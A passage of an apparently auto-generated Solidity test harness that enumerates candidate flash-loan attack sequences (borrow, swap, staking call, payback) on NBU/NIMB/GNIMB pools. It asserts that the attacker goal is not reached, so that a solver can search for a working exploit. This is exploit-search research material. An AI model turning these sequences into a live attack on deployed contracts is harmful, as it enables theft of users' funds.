        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4340(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4341(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4342(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4343(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4344(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4345(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4346(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4347(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4348(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4349(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4350(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4351(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4352(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4353(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4354(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4355(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4356(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4357(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4358(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4359(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4360(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4361(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4362(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4363(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4364(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4365(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4366(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4367(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4368(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4369(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4370(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4371(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4372(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4373(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4374(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4375(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4376(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4377(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4378(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4379(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4380(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4381(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4382(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4383(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4384(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4385(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
